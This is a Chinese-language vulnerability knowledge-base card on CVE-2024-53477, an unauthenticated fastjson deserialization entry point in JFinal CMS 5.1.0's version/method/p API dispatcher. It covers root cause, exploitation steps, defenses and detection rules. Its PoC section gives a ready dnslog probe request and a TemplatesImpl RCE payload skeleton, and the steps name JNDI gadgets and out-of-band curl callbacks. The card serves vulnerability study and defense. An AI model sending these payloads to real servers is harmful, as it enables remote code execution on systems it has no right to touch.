---
id: web-java-deser-fastjson-jfinalcms-api-version-method-dispatch-sink
title: JFinal CMS 未授权 API 的 version/method/p 三参分发：version 选 Logic 类、method 经反射 invokeMethod 调方法、p 直接进 fastjson parseObject（CVE-2024-53477）
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: jfinalcms-api-version-method-reflection-fastjson-sink
aliases:
- CVE-2024-53477
- JFinal CMS 命令执行
- ApiForm version method p
- ApiV100Logic
- ReflectionUtils invokeMethod
- fastjson 1.2.62 未授权入口
tags:
- java
- fastjson
- deserialization
- jfinal
- reflection
- rce
- unauthenticated
- api-dispatch
cve:
- CVE-2024-53477
severity: high
confidence: medium
status: verified
created: '2026-05-16'
updated: '2026-11-09'
affected_versions: JFinal CMS 5.1.0（CVE-2024-53477，原文标题标注的漏洞版本；fastjson 1.2.62；原文未给修复版本/区间）
verification:
  verified_by: verifier-T2-3W8
  verified_at: '2026-11-09T02:40:52+08:00'
  notes: 已对照原文核对：CVE-2024-53477 / JFinal CMS 5.1.0、fastjson 1.2.62、ApiForm.java 无 readObject 而导入 fastjson、version=1.0.0 选 ApiV100Logic、method 经 ReflectionUtils.invokeMethod 反射、p 进入业务方法、以及全文动态调用栈（ApiForm.getParams/getInt → ApiV100Logic.article → ReflectionUtils.invokeMethod → ApiService.action → ApiController.action → 各拦截器）均与正文一致；原文 PoC 的 val 写的是 127.0.0.1:8888 的自控监听地址，卡片改写为 dnslog 域名的等价探测形态（同一 Inet4Address 原语，非事实错误）；原文只到 DNS/连接探测、无 RCE 端到端 PoC，卡片的 TemplatesImpl 形态已标注所需条件；本次核对未读取图片，仅依据正文
---

## 一句话结论

JFinal CMS 5.1.0 的开放 API 用三个请求参数决定执行路径：`version` 映射到某个 Logic 实现类（如 `1.0.0` → `ApiV100Logic`）、`method` 通过 `ReflectionUtils.invokeMethod` 反射调用该类上的同名方法、`p` 作为该方法的业务参数被直接交给 fastjson `JSON.parseObject`。三者都不做鉴权与白名单，于是「`version=1.0.0&method=<合法方法名>&p=<fastjson payload>`」就成了一条无需登录、绕过 Controller 显式路由的 fastjson 反序列化入口；`p` 里出现 `@type` 时正是 fastjson 解析 AutoType 的路径。

## 原理

- **入口不在 Controller 上，而在拦截器链之后的分发器**：`ApiController.action` → `ApiService.action` → `ReflectionUtils.invokeMethod`，真正的业务方法由 `method` 参数在运行时决定。因此安全审计只看 `@RequestMapping` 找不到这个入口，必须顺着「参数参与反射」的调用点找。
- **`version` 是类选择器**：`ApiUtils` 按 `version` 值拼出 Logic 实现类名（`1.0.0` → `ApiV100Logic`）再实例化。这类「版本号选实现」的写法在多版本 API 的 CMS 里很常见，一旦版本号可被任意指定而实现类集合又不做白名单，攻击者就能把任意一个 Logic 类作为反射目标。
- **`method` 是可调方法名的直接来源**：`invokeMethod` 用传入的字符串在目标对象上 `getMethod`/`invoke`，没有「只允许该版本暴露的方法」的校验；原文给出的可达方法集合为 `article|folders|pageArticle|pageArticleSite`。危险不在于这些方法本身，而在于它们把 `p` 原样交给 JSON 解析。
- **`p` 直通 fastjson**：各 Logic 方法内部用 fastjson 把 `p` 解析成业务对象（`JSON.parseObject(p)` 一类的写法）。fastjson 1.2.62 在解析时遇到 `@type` 会尝试按类名反序列化，这是所有 fastjson gadget 的共通入口；因此「能控制 `p` 的完整字符串」等价于「能使用任意 fastjson payload」。
- **为什么能未授权**：`ApiInterceptor`/`CommonInterceptor`/`UserInterceptor` 等拦截器链只处理会话与路径重写，不校验 API 调用者的身份；`version`/`method`/`p` 三个参数在整条链上都被当作可信输入直接使用，没有任何一处做「方法是否属于该版本公开接口」或「`p` 中是否含 `@type`」的检查。
- **DNS 探测为什么足够定性**：`{"@type":"java.net.Inet4Address","val":"<子域>.dnslog"}` 在 fastjson 里由内置 `MiscCodec` 处理、会把 `val` 交给 `InetAddress.getByName` 触发 DNS 查询，即使 AutoType 关闭也常常可达。它证明的是「`p` 确实进了 fastjson 且 `@type` 被解析」，是判断该入口能否继续换用 RCE gadget 的低噪声验证手段。

## 触发条件

- 目标为 JFinal CMS 5.1.0（或包含同一套 `com.jflyfox.api` 分发代码的衍生版本），fastjson 依赖为 1.2.62 一类可解析 `@type` 的版本；
- `/api` 一类开放接口可从外部访问，且未要求登录（拦截器链不做身份校验）；
- 攻击者知道或能枚举出 `version` 与 `method` 的合法取值（`version=1.0.0`、`method` ∈ `article`/`folders`/`pageArticle`/`pageArticleSite` 等）；
- 服务端可出网（DNS 探测）或有本地 gadget 依赖（进一步 RCE）。

## 利用步骤

1. 探测入口：向 `ApiController` 对应路径提交 `version=1.0.0&method=<候选方法>&p={}`，按响应差异（报错栈里的 `ApiV100Logic`/`ApiForm` 类名、字段缺失提示）确认分发链与合法方法名。
2. 定性验证：把 `p` 换成 `{"@type":"java.net.Inet4Address","val":"<随机子域>.dnslog.cn"}`，观察 DNS 平台是否收到解析，确认 `p` 进入 fastjson 且 `@type` 生效。
3. 确认版本与依赖：结合报错里的 fastjson 类名/行号、`p` 传 `{"@type":"java.lang.Class","val":"com.alibaba.fastjson.JSON"}` 一类探针的回显，判断 fastjson 大版本与 AutoType 状态。
4. 换 RCE gadget：按目标依赖选择 TemplatesImpl（需 `Feature.SupportNonPublicField` 才会解析 `_bytecodes`）、JNDI（`@type` 指 `com.sun.rowset.JdbcRowSetImpl` 等）、或第三方依赖链；payload 直接作为 `p` 的 URL 编码值提交。
5. 无回显时用带外确认执行：gadget 内执行 `curl`/`nslookup` 到自控域名，或把结果写到 Web 可访问目录后请求读取。

## PoC

最小定性探测（确认 `p` 进入 fastjson 且 `@type` 被解析）：

```
GET /api?version=1.0.0&method=article&p=%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22abc123.dnslog.cn%22%7D HTTP/1.1
Host: target
```

解码后的 `p`：

```json
{"@type":"java.net.Inet4Address","val":"abc123.dnslog.cn"}
```

`p` 指向 TemplatesImpl 的形态（需目标 fastjson 解析非公有字段，且依赖 JDK 内 `com.sun.org.apache.xalan`）：

```json
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
 "_bytecodes":["<继承 AbstractTranslet、构造器里执行命令的类的 base64>"],
 "_name":"a","_tfactory":{},"_outputProperties":{}}
```

## 变体与关联

- **变体（参数形态）**：`p` 也可能是 POST body 里的 JSON 字段、或 base64 后解码，先按报错确认是否需要 URL 编码/是否要求 `Content-Type: application/json`。
- **变体（分发键）**：`version`/`method` 之外还可能有 `module`、`action`、`service` 这类同义键；凡是「请求参数决定类名或方法名」的地方都可用同样方式枚举可调用面。
- **变体（非 fastjson）**：同一分发器若把 `p` 交给 Jackson `readValue`、XStream `fromXML`、或 Java 原生 `ObjectInputStream`，攻击面随之切换，但「未授权 + 参数直达反序列化器」的结论不变。
- **关联**：[[web-java-deser-fastjson-inetaddress-dns-probe-malformed]]（`Inet4Address`/`InetSocketAddress` DNS 探测原语的原理与更多形态）、[[web-java-deser-fastjson-recon-version-dependency-probe]]（fastjson 版本与依赖探测）、[[web-java-deser-fastjson-templatesimpl-batchupdate-rce]]（`p` 进一步可换的 TemplatesImpl 落地链）、[[web-java-deser-fastjson-autotype-descriptor-bypass-evolution]]（1.2.6x→1.2.8x 的 AutoType 绕过演进）。

## 检测与防御

- **代码层**：API 分发不要用请求参数直接选类名/方法名；改成显式的 `switch`/映射表（键是枚举值，值是固定方法引用），并为每个方法声明允许的参数类型。`p` 的解析用 `JSON.parseObject(p, FixedDto.class)` 且**不开** `Feature.SupportNonPublicField`、显式 `ParserConfig` 关 AutoType；fastjson 升级到 1.2.83+ 并启用 safeMode（或迁到 fastjson2 明确关闭 autoType）。
- **鉴权层**：开放 API 也必须有身份校验与调用频控，`ApiInterceptor` 不能只做路径重写。
- **检测点**：请求中出现 `version=`/`method=`/`p=` 组合且 `p` 含 `@type`、`java.net.Inet4Address`、`TemplatesImpl`、`JdbcRowSetImpl`、`_bytecodes`；同一来源短时间内枚举 `method` 取值（方法名爆破）；应用进程出现异常 DNS 解析或派生子进程；日志里出现 fastjson `autoType is not support` 报错（多为探测失败）。
- **加固**：以低权限账户运行 JVM，限制出网（DNS/HTTP），禁用或裁剪不必要的 `com.sun` 内部类依赖；开启 RASP/JVM agent 对 `JSON.parseObject` 的 `@type` 检测。
